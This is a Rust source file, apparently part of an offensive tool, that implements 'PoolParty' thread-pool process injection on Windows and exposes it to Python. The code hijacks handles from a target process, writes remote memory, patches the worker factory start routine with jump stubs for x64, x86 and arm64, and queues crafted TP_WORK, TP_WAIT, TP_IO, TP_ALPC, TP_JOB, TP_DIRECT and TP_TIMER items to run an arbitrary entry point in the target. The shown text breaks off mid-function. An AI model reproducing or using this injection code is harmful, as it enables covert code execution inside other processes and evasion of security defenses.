use crate::prelude::*;
use crate::vm::prelude::*;

use crate::fs;
use crate::sysapi;
use crate::vm;

use std::cell::RefCell;
use std::fmt;
use std::path::PathBuf;
use std::slice;
use std::time::{SystemTime, UNIX_EPOCH};

use strum_macros::{EnumIter, FromRepr, IntoStaticStr, VariantArray};

use windef::{ntexapi, ntioapi, ntlpcapi, ntstatus, ntwin, winbase};

use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};
use windows_sys::Win32::Storage::FileSystem::{
    FILE_GENERIC_WRITE, FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE,
};
use windows_sys::Win32::System::Kernel::LIST_ENTRY;
use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows_sys::Win32::System::Threading::{
    CreateThreadpoolIo, CreateThreadpoolTimer, CreateThreadpoolWait, CreateThreadpoolWork,
    PTP_CALLBACK_INSTANCE, PTP_IO, PTP_TIMER, PTP_TIMER_CALLBACK, PTP_WAIT, PTP_WAIT_CALLBACK,
    PTP_WIN32_IO_CALLBACK, PTP_WORK, PTP_WORK_CALLBACK, TIMER_ALL_ACCESS, TP_CALLBACK_PRIORITY_HIGH,
};

use vm::py_proc::Process;
use vm::py_resource::Handle;
use vm::api_strategy;

#[allow(non_camel_case_types)]
#[repr(u32)]
#[derive(Debug, Clone, Copy, PartialEq, VariantArray, FromRepr, IntoStaticStr, EnumIter)]
pub enum ThreadPoolWorkItem {
    WorkerFactoryStartRoutine,
    TP_WORK,
    TP_WAIT,
    TP_IO,
    TP_ALPC,
    TP_JOB,
    TP_DIRECT,
    TP_TIMER,
}

impl fmt::Display for ThreadPoolWorkItem {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{self:?}")
    }
}

type PfnTpAllocAlpcCompletion = unsafe extern "system" fn(
    *mut *mut ntwin::FULL_TP_ALPC,
    HANDLE,
    PVOID,
    PVOID,
    PVOID,
) -> NTSTATUS;
type PfnTpAllocJobNotification = unsafe extern "system" fn(
    *mut *mut ntwin::FULL_TP_JOB,
    HANDLE,
    PVOID,
    PVOID,
    PVOID,
) -> NTSTATUS;

const ALPC_MESSAGE_SIZE: usize = 0x148;
const ALPC_CONNECT_TIMEOUT: i64 = -10_000_000;

#[pyclass(module = false, name = "WORKER_FACTORY_BASIC_INFORMATION")]
#[derive(PyPayload)]
pub struct CWorkerFactoryBasicInformation {
    data: ntexapi::WORKER_FACTORY_BASIC_INFORMATION,
}

impl fmt::Debug for CWorkerFactoryBasicInformation {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(
            f,
            "CWorkerFactoryBasicInformation {{ StartRoutine: {:?}, StartParameter: {:?}, TotalWorkerCount: {} }}",
            self.data.StartRoutine, self.data.StartParameter, self.data.TotalWorkerCount
        )
    }
}

#[pyclass]
impl CWorkerFactoryBasicInformation {
    #[pygetset(name = "StartRoutine")]
    fn start_routine(&self) -> usize {
        self.data.StartRoutine as _
    }

    #[pygetset(name = "StartParameter")]
    fn start_parameter(&self) -> usize {
        self.data.StartParameter as _
    }

    #[pygetset(name = "TotalWorkerCount")]
    fn total_worker_count(&self) -> u32 {
        self.data.TotalWorkerCount
    }

    #[pygetset(name = "ThreadMinimum")]
    fn thread_minimum(&self) -> u32 {
        self.data.ThreadMinimum
    }

    #[pygetset(name = "ThreadMaximum")]
    fn thread_maximum(&self) -> u32 {
        self.data.ThreadMaximum
    }
}

#[pyclass(module = false, name = "ThreadPool")]
#[derive(Debug, PyPayload)]
pub struct ThreadPool {
    process: PyRef<Process>,
    worker_factory_handle: RefCell<Option<PyRef<Handle>>>,
    io_completion_handle: RefCell<Option<PyRef<Handle>>>,
    timer_handle: RefCell<Option<PyRef<Handle>>>,
}

#[derive(FromArgs)]
pub struct ThreadPoolNewArgs {
    #[pyarg(any)]
    process: PyRef<Process>,
}

#[derive(FromArgs)]
pub struct ThreadPoolSetEpArgs {
    #[pyarg(any)]
    work_item_type: u32,
    #[pyarg(any)]
    ep: u64,
}

#[derive(FromArgs)]
pub struct ThreadPoolEpArgs {
    #[pyarg(any)]
    ep: u64,
}

impl Constructor for ThreadPool {
    type Args = ThreadPoolNewArgs;

    fn py_new(_cls: &Py<PyType>, args: Self::Args, _vm: &VirtualMachine) -> PyResult<Self> {
        Ok(Self {
            process: args.process,
            worker_factory_handle: None.into(),
            io_completion_handle: None.into(),
            timer_handle: None.into(),
        })
    }
}

#[pyclass(with(Constructor))]
impl ThreadPool {
    #[pymethod]
    fn open_worker_factory(&self, vm: &VirtualMachine) -> PyResult<()> {
        let handle = self.hijack_handle("TpWorkerFactory", ntexapi::WORKER_FACTORY_ALL_ACCESS, vm)?;
        self.worker_factory_handle.replace(Some(Handle { handle }.into_ref(&vm.ctx)));
        Ok(())
    }

    #[pymethod]
    fn open_io_completion(&self, vm: &VirtualMachine) -> PyResult<()> {
        let handle = self.hijack_handle("IoCompletion", ntioapi::IO_COMPLETION_ALL_ACCESS, vm)?;
        self.io_completion_handle.replace(Some(Handle { handle }.into_ref(&vm.ctx)));
        Ok(())
    }

    #[pymethod]
    fn open_timer(&self, vm: &VirtualMachine) -> PyResult<()> {
        let handle = self.hijack_handle("IRTimer", TIMER_ALL_ACCESS, vm)?;
        self.timer_handle.replace(Some(Handle { handle }.into_ref(&vm.ctx)));
        Ok(())
    }

    #[pymethod]
    fn get_worker_factory_basic_info(&self, vm: &VirtualMachine) -> PyResult<CWorkerFactoryBasicInformation> {
        let worker_factory_handle = self.ensure_worker_factory_handle(vm)?;
        let data = sysapi::get_worker_factory_basic_info(worker_factory_handle)
            .map_err(map_to_py_system_error(vm, "Unable to get worker factory basic information"))?;

        Ok(CWorkerFactoryBasicInformation { data })
    }

    #[pymethod]
    fn set_ep(&self, args: ThreadPoolSetEpArgs, vm: &VirtualMachine) -> PyResult<()> {
        let work_item_type = ThreadPoolWorkItem::from_repr(args.work_item_type)
            .ok_or_else(|| vm.new_value_error("Invalid ThreadPoolWorkItem".to_string()))?;

        match work_item_type {
            ThreadPoolWorkItem::WorkerFactoryStartRoutine => {
                self.set_worker_factory_start_routine_ep_impl(args.ep as _, vm)
            }
            ThreadPoolWorkItem::TP_WORK => self.queue_tp_work_impl(args.ep as _, vm),
            ThreadPoolWorkItem::TP_WAIT => self.queue_tp_wait_impl(args.ep as _, vm),
            ThreadPoolWorkItem::TP_IO => self.queue_tp_io_impl(args.ep as _, vm),
            ThreadPoolWorkItem::TP_ALPC => self.queue_tp_alpc_impl(args.ep as _, vm),
            ThreadPoolWorkItem::TP_JOB => self.queue_tp_job_impl(args.ep as _, vm),
            ThreadPoolWorkItem::TP_DIRECT => self.queue_tp_direct_impl(args.ep as _, vm),
            ThreadPoolWorkItem::TP_TIMER => self.queue_tp_timer_impl(args.ep as _, vm),
        }
    }

    #[pymethod]
    fn set_worker_factory_start_routine_ep(&self, args: ThreadPoolEpArgs, vm: &VirtualMachine) -> PyResult<()> {
        self.set_worker_factory_start_routine_ep_impl(args.ep as _, vm)
    }

    #[pymethod]
    fn queue_tp_work(&self, args: ThreadPoolEpArgs, vm: &VirtualMachine) -> PyResult<()> {
        self.queue_tp_work_impl(args.ep as _, vm)
    }

    #[pymethod]
    fn queue_tp_wait(&self, args: ThreadPoolEpArgs, vm: &VirtualMachine) -> PyResult<()> {
        self.queue_tp_wait_impl(args.ep as _, vm)
    }

    #[pymethod]
    fn queue_tp_io(&self, args: ThreadPoolEpArgs, vm: &VirtualMachine) -> PyResult<()> {
        self.queue_tp_io_impl(args.ep as _, vm)
    }

    #[pymethod]
    fn queue_tp_alpc(&self, args: ThreadPoolEpArgs, vm: &VirtualMachine) -> PyResult<()> {
        self.queue_tp_alpc_impl(args.ep as _, vm)
    }

    #[pymethod]
    fn queue_tp_job(&self, args: ThreadPoolEpArgs, vm: &VirtualMachine) -> PyResult<()> {
        self.queue_tp_job_impl(args.ep as _, vm)
    }

    #[pymethod]
    fn queue_tp_direct(&self, args: ThreadPoolEpArgs, vm: &VirtualMachine) -> PyResult<()> {
        self.queue_tp_direct_impl(args.ep as _, vm)
    }

    #[pymethod]
    fn queue_tp_timer(&self, args: ThreadPoolEpArgs, vm: &VirtualMachine) -> PyResult<()> {
        self.queue_tp_timer_impl(args.ep as _, vm)
    }
}

impl ThreadPool {
    fn process_handle(&self, vm: &VirtualMachine) -> PyResult<HANDLE> {
        let process_handle = **self.process.process_handle.borrow();
        if process_handle.is_null() {
            return Err(vm.new_system_error("Process is not opened"));
        }

        Ok(process_handle)
    }

    fn ensure_native_bitness(&self, vm: &VirtualMachine) -> PyResult<()> {
        let is_64 = self.process.is_x64(vm)?;

        #[cfg(target_arch = "x86_64")]
        if !is_64 {
            return Err(vm.new_value_error("ThreadPool object insertion requires native x64 target".to_string()));
        }

        #[cfg(target_arch = "x86")]
        if is_64 {
            return Err(vm.new_value_error("ThreadPool object insertion requires native x86 target".to_string()));
        }

        #[cfg(target_arch = "aarch64")]
        if !is_64 {
            return Err(vm.new_value_error("ThreadPool object insertion requires native arm64 target".to_string()));
        }

        Ok(())
    }

    fn ensure_remote_writes_supported(&self, vm: &VirtualMachine) -> PyResult<()> {
        let process_vm_write_strategy = self.process.process_vm_write_strategy.borrow().clone();

        if process_vm_write_strategy == Some(api_strategy::ProcessVmWriteStrategy::CreateSectionMapLocalMap) {
            return Err(vm.new_value_error("ThreadPool object insertion requires a remote-write strategy, not CreateSectionMapLocalMap".to_string()));
        }

        Ok(())
    }

    fn ensure_thread_pool_injection_ready(&self, vm: &VirtualMachine) -> PyResult<()> {
        self.ensure_native_bitness(vm)?;
        self.ensure_remote_writes_supported(vm)
    }

    fn hijack_handle(&self, object_type: &str, desired_access: u32, vm: &VirtualMachine) -> PyResult<sysapi::UniqueHandle> {
        let process_handle = self.process_handle(vm)?;
        let handles = sysapi::get_process_handle_snapshot(process_handle)
            .map_err(map_to_py_system_error(vm, "Unable to get process handle snapshot"))?;

        for handle in handles {
            let duplicated_handle = match sysapi::duplicate_handle(
                winbase::NT_CURRENT_PROCESS,
                handle,
                process_handle
            ) {
                Ok(handle) => handle,
                Err(_) => continue,
            };

            let handle_type = match sysapi::get_handle_type(*duplicated_handle) {
                Ok(handle_type) => handle_type,
                Err(_) => continue,
            };

            if handle_type != object_type {
                continue;
            }

            let duplicated_handle = match sysapi::duplicate_handle_with_access(
                winbase::NT_CURRENT_PROCESS,
                handle,
                process_handle,
                desired_access,
            ) {
                Ok(handle) => handle,
                Err(_) => continue,
            };

            return Ok(duplicated_handle);
        }

        Err(vm.new_system_error(format!("Unable to hijack {object_type} handle")))
    }

    fn ensure_worker_factory_handle(&self, vm: &VirtualMachine) -> PyResult<HANDLE> {
        if self.worker_factory_handle.borrow().is_none() {
            self.open_worker_factory(vm)?;
        }

        let handle = self.worker_factory_handle.borrow();
        let handle = handle.as_ref()
            .ok_or_else(|| vm.new_value_error("Worker factory handle is not initialized".to_string()))?;

        Ok(*handle.handle)
    }

    fn ensure_io_completion_handle(&self, vm: &VirtualMachine) -> PyResult<HANDLE> {
        if self.io_completion_handle.borrow().is_none() {
            self.open_io_completion(vm)?;
        }

        let handle = self.io_completion_handle.borrow();
        let handle = handle.as_ref()
            .ok_or_else(|| vm.new_value_error("IO completion handle is not initialized".to_string()))?;

        Ok(*handle.handle)
    }

    fn ensure_timer_handle(&self, vm: &VirtualMachine) -> PyResult<HANDLE> {
        if self.timer_handle.borrow().is_none() {
            self.open_timer(vm)?;
        }

        let handle = self.timer_handle.borrow();
        let handle = handle.as_ref()
            .ok_or_else(|| vm.new_value_error("Timer handle is not initialized".to_string()))?;

        Ok(*handle.handle)
    }

    fn create_io_file(&self, vm: &VirtualMachine) -> PyResult<sysapi::UniqueHandle> {
        let mut path = PathBuf::from(fs::get_temp_folder());
        path.push(format!("br3k_poolparty_io_{}_{}.tmp", *self.process.pid.borrow(), unique_suffix()));
        let path = path.to_string_lossy();

        sysapi::create_file_by_nt_create_file_with_options(
            &path,
            FILE_GENERIC_WRITE,
            FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
            ntioapi::FILE_OVERWRITE_IF,
            ntioapi::FILE_NON_DIRECTORY_FILE,
            Some(1)
        )
        .map_err(map_to_py_system_error(vm, "Unable to create TP_IO file"))
    }

    fn tp_alloc_alpc_completion(&self, alpc_port: HANDLE, ep: PVOID, vm: &VirtualMachine) -> PyResult<*mut ntwin::FULL_TP_ALPC> {
        unsafe {
            let proc = sysapi::SysApiCtx::get_proc_address("ntdll.dll", "TpAllocAlpcCompletion")
                .map_err(map_to_py_system_error(vm, "Unable to get TpAllocAlpcCompletion"))?;
            let tp_alloc_alpc_completion = mem::transmute::<PVOID, PfnTpAllocAlpcCompletion>(proc);
            let mut tp_alpc = ptr::null_mut();
            let status = tp_alloc_alpc_completion(addr_of_mut!(tp_alpc), alpc_port, ep, ptr::null_mut(), ptr::null_mut());

            if status < 0 {
                Err(vm.new_system_error(format!("TpAllocAlpcCompletion failed: 0x{:08x}", status as u32)))
            } else {
                Ok(tp_alpc)
            }
        }
    }

    fn tp_alloc_job_notification(&self, job_handle: HANDLE, ep: PVOID, vm: &VirtualMachine) -> PyResult<*mut ntwin::FULL_TP_JOB> {
        unsafe {
            let proc = sysapi::SysApiCtx::get_proc_address("ntdll.dll", "TpAllocJobNotification")
                .map_err(map_to_py_system_error(vm, "Unable to get TpAllocJobNotification"))?;
            let tp_alloc_job_notification = mem::transmute::<PVOID, PfnTpAllocJobNotification>(proc);
            let mut tp_job = ptr::null_mut();
            let status = tp_alloc_job_notification(addr_of_mut!(tp_job), job_handle, ep, ptr::null_mut(), ptr::null_mut());

            if status < 0 {
                Err(vm.new_system_error(format!("TpAllocJobNotification failed: 0x{:08x}", status as u32)))
            } else {
                Ok(tp_job)
            }
        }
    }

    fn remote_read_value<T>(&self, address: PVOID, vm: &VirtualMachine) -> PyResult<T>
    where
        T: Default,
    {
        let memory = self.process.memory.borrow();
        let memory = memory.as_ref()
            .ok_or_else(|| vm.new_value_error("Memory context is not initialized".to_string()))?;

        let mut remote_memory = memory.clone();
        let mut value = T::default();

        remote_memory.set_remote_base_addr(address);
        remote_memory
            .read_memory(0, addr_of_mut!(value) as _, size_of::<T>())
            .map_err(map_process_memory_error_to_py_exception(vm, "Unable to read remote thread pool data"))?;

        Ok(value)
    }

    fn remote_write_bytes(&self, address: PVOID, data: &[u8], vm: &VirtualMachine) -> PyResult<()> {
        let memory = self.process.memory.borrow();
        let memory = memory.as_ref()
            .ok_or_else(|| vm.new_value_error("Memory context is not initialized".to_string()))?;

        let mut remote_memory = memory.clone();

        remote_memory.set_remote_base_addr(address);
        remote_memory
            .write_memory(0, data.as_ptr() as _, data.len())
            .map_err(map_process_memory_error_to_py_exception(vm, "Unable to write remote thread pool data"))?;

        Ok(())
    }

    fn remote_write_value<T>(&self, address: PVOID, value: &T, vm: &VirtualMachine) -> PyResult<()> {
        let data = unsafe { slice::from_raw_parts(value as *const T as *const u8, size_of::<T>()) };
        self.remote_write_bytes(address, data, vm)
    }

    fn remote_write_pointer(&self, address: PVOID, value: PVOID, vm: &VirtualMachine) -> PyResult<()> {
        let value = value as usize;
        self.remote_write_value(address, &value, vm)
    }

    fn remote_alloc_write_value<T>(&self, value: &T, vm: &VirtualMachine) -> PyResult<PVOID> {
        let data = unsafe { slice::from_raw_parts(value as *const T as *const u8, size_of::<T>()) };
        self.remote_alloc_write_bytes(data, vm)
    }

    fn remote_alloc_write_bytes(&self, data: &[u8], vm: &VirtualMachine) -> PyResult<PVOID> {
        let memory = self.process.memory.borrow();
        let memory = memory.as_ref()
            .ok_or_else(|| vm.new_value_error("Memory context is not initialized".to_string()))?;

        let mut remote_memory = memory.clone();
        remote_memory.set_remote_base_addr(ptr::null_mut());
        remote_memory
            .create_memory(data.len())
            .map_err(map_process_memory_error_to_py_exception(vm, "Unable to allocate remote thread pool data"))?;

        remote_memory
            .write_memory(0, data.as_ptr() as _, data.len())
            .map_err(map_process_memory_error_to_py_exception(vm, "Unable to write remote thread pool data"))?;

        Ok(remote_memory.get_remote_base_addr())
    }

    fn worker_factory_basic_info(&self, vm: &VirtualMachine) -> PyResult<ntexapi::WORKER_FACTORY_BASIC_INFORMATION> {
        let worker_factory_handle = self.ensure_worker_factory_handle(vm)?;
        sysapi::get_worker_factory_basic_info(worker_factory_handle)
            .map_err(map_to_py_system_error(vm, "Unable to get worker factory basic information"))
    }

    fn wake_worker_factory(&self, worker_factory_info: &ntexapi::WORKER_FACTORY_BASIC_INFORMATION, vm: &VirtualMachine) -> PyResult<()> {
        let worker_factory_handle = self.ensure_worker_factory_handle(vm)?;
        let worker_minimum = worker_factory_info.TotalWorkerCount + 1;

        sysapi::set_worker_factory_thread_minimum(worker_factory_handle, worker_minimum)
            .map_err(map_to_py_system_error(vm, "Unable to update worker factory thread minimum"))?;

        Ok(())
    }

    fn set_worker_factory_start_routine_ep_impl(&self, ep: PVOID, vm: &VirtualMachine) -> PyResult<()> {
        self.ensure_thread_pool_injection_ready(vm)?;

        let process_handle = self.process_handle(vm)?;
        let worker_factory_info = self.worker_factory_basic_info(vm)?;
        let jump = jump_to_ep(ep)
            .ok_or_else(|| vm.new_system_error("ThreadPool worker factory start routine patch is not implemented for this architecture"))?;

        sysapi::protect_virtual_memory(
            worker_factory_info.StartRoutine,
            jump.len(),
            PAGE_EXECUTE_READWRITE,
            process_handle
        )
        .map_err(map_to_py_system_error(vm, "Unable to change worker factory start routine protection"))?;

        self.remote_write_bytes(worker_factory_info.StartRoutine, &jump, vm)?;
        sysapi::flush_instruction_cache(process_handle, worker_factory_info.StartRoutine, jump.len())
            .map_err(map_to_py_system_error(vm, "Unable to flush worker factory start routine instruction cache"))?;

        self.wake_worker_factory(&worker_factory_info, vm)
    }

    fn queue_tp_work_impl(&self, ep: PVOID, vm: &VirtualMachine) -> PyResult<()> {
        self.ensure_thread_pool_injection_ready(vm)?;

        let worker_factory_info = self.worker_factory_basic_info(vm)?;
        let target_pool: ntwin::FULL_TP_POOL = self.remote_read_value(worker_factory_info.StartParameter, vm)?;
        let target_task_queue = target_pool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH as usize];

        if target_task_queue.is_null() {
            return Err(vm.new_system_error("Target TP_POOL high-priority task queue is null"));
        }

        let target_task_queue_list = unsafe { (target_task_queue as PVOID).add(offset_of!(ntwin::TPP_QUEUE, Queue)) };
        let tp_work = unsafe {
            let tp_work = CreateThreadpoolWork(work_callback(ep), ptr::null_mut(), ptr::null());
            if tp_work == 0 {
                return Err(vm.new_system_error("CreateThreadpoolWork failed"));
            }

            tp_work as *mut ntwin::FULL_TP_WORK
        };

        unsafe {
            (*tp_work).CleanupGroupMember.Pool = worker_factory_info.StartParameter as _;
            (*tp_work).Task.ListEntry.Flink = target_task_queue_list as _;
            (*tp_work).Task.ListEntry.Blink = target_task_queue_list as _;
            (*tp_work).WorkState.Exchange = 0x2;
        }

        let remote_tp_work = unsafe { self.remote_alloc_write_value(&*tp_work, vm)? };
        let remote_work_task_list = unsafe {
            remote_tp_work
                .add(offset_of!(ntwin::FULL_TP_WORK, Task))
                .add(offset_of!(ntwin::TP_TASK, ListEntry))
        };

        self.remote_write_pointer(
            unsafe { target_task_queue_list.add(offset_of!(LIST_ENTRY, Flink)) },
            remote_work_task_list,
            vm
        )?;
        self.remote_write_pointer(
            unsafe { target_task_queue_list.add(offset_of!(LIST_ENTRY, Blink)) },
            remote_work_task_list,
            vm
        )?;

        self.wake_worker_factory(&worker_factory_info, vm)
    }

    fn queue_tp_wait_impl(&self, ep: PVOID, vm: &VirtualMachine) -> PyResult<()> {
        self.ensure_thread_pool_injection_ready(vm)?;

        let io_completion_handle = self.ensure_io_completion_handle(vm)?;
        let tp_wait = unsafe {
            let tp_wait = CreateThreadpoolWait(wait_callback(ep), ptr::null_mut(), ptr::null());
            if tp_wait == 0 {
                return Err(vm.new_system_error("CreateThreadpoolWait failed"));
            }

            tp_wait as *mut ntwin::FULL_TP_WAIT
        };

        let remote_tp_wait = unsafe { self.remote_alloc_write_value(&*tp_wait, vm)? };
        let remote_tp_direct = unsafe { self.remote_alloc_write_value(&(*tp_wait).Direct, vm)? };
        let event_handle = sysapi::create_event()
            .map_err(map_to_py_system_error(vm, "Unable to create event for TP_WAIT"))?;

        unsafe {
            sysapi::associate_wait_completion_packet(
                (*tp_wait).WaitPkt,
                io_completion_handle,
                *event_handle,
                remote_tp_direct,
                remote_tp_wait,
                ntstatus::STATUS_SUCCESS,
                0,
            )
            .map_err(map_to_py_system_error(vm, "Unable to associate TP_WAIT completion packet"))?;
        }

        sysapi::set_event(*event_handle)
            .map_err(map_to_py_system_error(vm, "Unable to trigger TP_WAIT event"))?;

        Ok(())
    }

    fn queue_tp_io_impl(&self, ep: PVOID, vm: &VirtualMachine) -> PyResult<()> {
        self.ensure_thread_pool_injection_ready(vm)?;

        let io_completion_handle = self.ensure_io_completion_handle(vm)?;
        let file_handle = self.create_io_file(vm)?;
        let tp_io = unsafe {
            let tp_io = CreateThreadpoolIo(*file_handle, io_callback(ep), ptr::null_mut(), ptr::null());
            if tp_io == 0 {
                return Err(vm.new_system_error("CreateThreadpoolIo failed"));
            }

            tp_io as *mut ntwin::FULL_TP_IO
        };

        unsafe {
            (*tp_io).CleanupGroupMember.Callback = ep;
            (*tp_io).Direct.Callback = ep;
            (*tp_io).PendingIrpCount += 1;
        }

        let remote_tp_io = unsafe { self.remote_alloc_write_value(&*tp_io, vm)? };
        let remote_tp_direct = unsafe { remote_tp_io.add(offset_of!(ntwin::FULL_TP_IO, Direct)) };

        sysapi::set_file_completion_information(*file_handle, io_completion_handle, remote_tp_direct)
            .map_err(map_to_py_system_error(vm, "Unable to associate TP_IO completion port"))?;

        let data = [0u8; 1];
        sysapi::write_file_at(*file_handle, data.as_ptr() as _, data.len(), 0)
            .map_err(map_to_py_system_error(vm, "Unable to trigger TP_IO"))?;

        Ok(())
    }

    fn queue_tp_alpc_impl(&self, ep: PVOID, vm: &VirtualMachine) -> PyResult<()> {
        self.ensure_thread_pool_injection_ready(vm)?;

        let io_completion_handle = self.ensure_io_completion_handle(vm)?;
        let temp_alpc_port = sysapi::create_alpc_port(None, 0, ALPC_MESSAGE_SIZE as _)
            .map_err(map_to_py_system_error(vm, "Unable to create temporary ALPC port"))?;
        let tp_alpc = self.tp_alloc_alpc_completion(*temp_alpc_port, ep, vm)?;
        let alpc_name = format!("\\RPC Control\\Br3kPoolPartyAlpc_{}_{}", *self.process.pid.borrow(), unique_suffix());
        let alpc_port = sysapi::create_alpc_port(
            Some(&alpc_name),
            ntlpcapi::ALPC_PORFLG_ALLOW_LPC_REQUESTS,
            ALPC_MESSAGE_SIZE as _,
        )
        .map_err(map_to_py_system_error(vm, "Unable to create TP_ALPC port"))?;

        unsafe {
            (*tp_alpc).Direct.Callback = ep;
            (*tp_alpc).CleanupGroupMember.Callback = ep;
            (*tp_alpc).AlpcPort = *alpc_port;
        }

        let remote_tp_alpc = unsafe { self.remote_alloc_write_value(&*tp_alpc, vm)? };

        sysapi::set_alpc_completion_port(*alpc_port, io_completion_handle, remote_tp_alpc)
            .map_err(map_to_py_system_error(vm, "Unable to associate TP_ALPC completion port"))?;
        sysapi::connect_alpc_port(&alpc_name, ALPC_MESSAGE_SIZE, ALPC_CONNECT_TIMEOUT)
            .map_err(map_to_py_system_error(vm, "Unable to trigger TP_ALPC"))?;

        Ok(())
    }

    fn queue_tp_job_impl(&self, ep: PVOID, vm: &VirtualMachine) -> PyResult<()> {
        self.ensure_thread_pool_injection_ready(vm)?;

        let io_completion_handle = self.ensure_io_completion_handle(vm)?;
        let job_handle = sysapi::create_job_object()
            .map_err(map_to_py_system_error(vm, "Unable to create TP_JOB job object"))?;
        let tp_job = self.tp_alloc_job_notification(*job_handle, ep, vm)?;

        unsafe {
            (*tp_job).Direct.Callback = ep;
            (*tp_job).CleanupGroupMember.Callback = ep;
            (*tp_job).JobHandle = *job_handle;
        }

        let remote_tp_job = unsafe { self.remote_alloc_write_value(&*tp_job, vm)? };

        sysapi::set_job_completion_port(*job_handle, ptr::null_mut(), ptr::null_mut())
            .map_err(map_to_py_system_error(vm, "Unable to reset TP_JOB completion port"))?;
        sysapi::set_job_completion_port(*job_handle, io_completion_handle, remote_tp_job)
            .map_err(map_to_py_system_error(vm, "Unable to associate TP_JOB completion port"))?;
        sysapi::assign_process_to_job_object(*job_handle, winbase::NT_CURRENT_PROCESS)
            .map_err(map_to_py_system_error(vm, "Unable to trigger TP_JOB"))?;

        Ok(())
    }

    fn queue_tp_direct_impl(&self, ep: PVOID, vm: &VirtualMachine) -> PyResult<()> {
        self.ensure_thread_pool_injection_ready(vm)?;

        let io_completion_handle = self.ensure_io_completion_handle(vm)?;
        let direct = ntwin::TP_DIRECT { Callback: ep, ..Default::default() };
        let remote_direct = self.remote_alloc_write_value(&direct, vm)?;

        sysapi::set_io_completion(
            io_completion_handle,
            remote_direct,
            ptr::null_mut(),
            ntstatus::STATUS_SUCCESS,
            0,
        )
        .map_err(map_to_py_system_error(vm, "Unable to queue TP_DIRECT IO completion"))?;

        Ok(())
    }

    fn queue_tp_timer_impl(&self, ep: PVOID, vm: &VirtualMachine) -> PyResult<()> {
        self.ensure_thread_pool_injection_ready(vm)?;

        let timer_handle = self.ensure_timer_handle(vm)?;
        let worker_factory_info = self.worker_factory_basic_info(vm)?;
        let due_time: i64 = -10_000_000;
        let tp_timer = unsafe {
            let tp_timer = CreateThreadpoolTimer(timer_callback(ep), ptr::null_mut(), ptr::null());
            if tp_timer == 0 {
                return Err(vm.new_system_error("CreateThreadpoolTimer failed"));
            }

            tp_timer as *mut ntwin::FULL_TP_TIMER
        };

        let remote_tp_timer = self.remote_alloc_write_value(&ntwin::FULL_TP_TIMER::default(), vm)?;

        unsafe {
            (*tp_timer).Work.CleanupGroupMember.Pool = worker_factory_info.StartParameter as _;
            (*tp_timer).DueTime = due_time;
            (*tp_timer).WindowStartLinks.Key = due_time;
            (*tp_timer).WindowEndLinks.Key = due_time;

            let remote_window_start_children = remote_tp_timer
                .add(offset_of!(ntwin::FULL_TP_TIMER, WindowStartLinks))
                .add(offset_of!(ntwin::TPP_PH_LINKS, Children));
            let remote_window_end_children = remote_tp_timer
                .add(offset_of!(ntwin::FULL_TP_TIMER, WindowEndLinks))
                .add(offset_of!(ntwin::TPP_PH_LINKS, Children));

            (*tp_timer).WindowStartLinks.Children.Flink = remote_window_start_children as _;
            (*tp_timer).WindowStartLinks.Children.Blink = remote_window_start_children as _;
            (*tp_timer).WindowEndLinks.Children.Flink = remote_window_end_children as _;
            (*tp_timer).WindowEndLinks.Children.Blink = remote_window_end_children as _;
        }

        unsafe {
            self.remote_write_value(remote_tp_timer, &*tp_timer, vm)?;

            let target_window_start_root = worker_factory_info.StartParameter
                .add(offset_of!(ntwin::FULL_TP_POOL, TimerQueue))
                .add(offset_of!(ntwin::TPP_TIMER_QUEUE, AbsoluteQueue))
                .add(offset_of!(ntwin::TPP_TIMER_SUBQUEUE, WindowStart))
                .add(offset_of!(ntwin::TPP_PH, Root));
            let target_window_end_root = worker_factory_info.StartParameter
                .add(offset_of!(ntwin::FULL_TP_POOL, TimerQueue))
                .add(offset_of!(ntwin::TPP_TIMER_QUEUE, AbsoluteQueue))
                .add(offset_of!(ntwin::TPP_TIMER_SUBQUEUE, WindowEnd))
                .add(offset_of!(ntwin::TPP_PH, Root));
            let remote_window_start = remote_tp_timer.add(offset_of!(ntwin::FULL_TP_TIMER, WindowStartLinks));
            let remote_window_end = remote_tp_timer.add(offset_of!(ntwin::FULL_TP_TIMER, WindowEndLinks));

            self.remote_write_pointer(target_window_start_root, remote_window_start, vm)?;
            self.remote_write_pointer(target_window_end_root, remote_window_end, vm)?;
        }

        sysapi::set_timer2(timer_handle, due_time)
            .map_err(map_to_py_system_error(vm, "Unable to trigger TP_TIMER"))?;

        Ok(())
    }
}

fn jump_to_ep(ep: PVOID) -> Option<Vec<u8>> {
    #[cfg(target_arch = "x86_64")]
    {
        let mut jump = Vec::with_capacity(12);
        jump.extend_from_slice(&[0x48, 0xB8]);
        jump.extend_from_slice(&(ep as u64).to_le_bytes());
        jump.extend_from_slice(&[0xFF, 0xE0]);
        return Some(jump);
    }

    #[cfg(target_arch = "x86")]
    {
        let mut jump = Vec::with_capacity(7);
        jump.push(0xB8);
        jump.extend_from_slice(&(ep as u32).to_le_bytes());
        jump.extend_from_slice(&[0xFF, 0xE0]);
        return Some(jump);
    }

    #[cfg(target_arch = "aarch64")]
    {
        let address = ep as u64;
        let reg = 16u32;
        let mut jump = Vec::with_capacity(20);

        for i in 0..4 {
            let imm = ((address >> (i * 16)) & 0xFFFF) as u32;
            let opcode = if i == 0 { 0xD2800000 } else { 0xF2800000 };
            let instruction = opcode | ((i as u32) << 21) | (imm << 5) | reg;
            jump.extend_from_slice(&instruction.to_le_bytes());
        }

        let br = 0xD61F0000u32 | (reg << 5);
        jump.extend_from_slice(&br.to_le_bytes());
        return Some(jump);
    }

    #[allow(unreachable_code)]
    None
}

unsafe fn work_callback(ep: PVOID) -> PTP_WORK_CALLBACK {
    Some(unsafe {
        mem::transmute::<PVOID, unsafe extern "system" fn(PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK)>(ep)
    })
}

unsafe fn wait_callback(ep: PVOID) -> PTP_WAIT_CALLBACK {
    Some(unsafe {
        mem::transmute::<PVOID, unsafe extern "system" fn(PTP_CALLBACK_INSTANCE, PVOID, PTP_WAIT, u32)>(ep)
    })
}

unsafe fn io_callback(ep: PVOID) -> PTP_WIN32_IO_CALLBACK {
    Some(unsafe {
